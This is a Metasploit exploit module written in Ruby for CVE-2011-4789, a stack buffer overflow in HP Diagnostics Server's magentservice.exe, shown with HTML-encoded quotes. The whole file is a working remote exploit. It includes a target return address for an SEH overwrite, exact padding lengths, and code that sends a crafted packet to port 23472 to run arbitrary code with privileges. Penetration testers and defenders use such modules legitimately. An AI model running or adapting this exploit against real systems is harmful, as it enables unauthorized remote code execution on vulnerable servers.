class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP Diagnostics Server magentservice.exe overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack buffer overflow in HP Diagnostics Server
                magentservice.exe service. By sending a specially crafted packet, an attacker
                may be able to execute arbitrary code. Originally found and posted by
                AbdulAziz Harir via ZDI.
            },
            &#039;Author&#039;         =>
                [
                    &#039;AbdulAziz Hariri&#039;, # Original discovery
                    &#039;hal&#039;,              # Metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;72815&#039;],
                    [&#039;CVE&#039;, &#039;2011-4789&#039;],
                    [&#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-016/&#039;]
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                    &#039;SSL&#039; => true,
                    &#039;SSLVersion&#039; => &#039;SSL3&#039;
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;DefaultTarget&#039;  => 0,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Diagnostics Server 9.10&#039;,
                        {
                            # pop esi # pop ebx # ret 10
                            # magentservice.exe
                            &#039;Ret&#039; => 0x780c8f1f
                        }
                    ]
                ],
            &#039;DisclosureDate&#039; => &#039;Jan 12 2012&#039;))
            register_options([Opt::RPORT(23472)], self.class)
    end
    def exploit
        req =  "\x00\x00\x00\x00"
        req << rand_text_alpha_upper(1092)
        req << generate_seh_payload(target.ret)
        connect
        sock.put(req)
        handler
        disconnect
    end
end



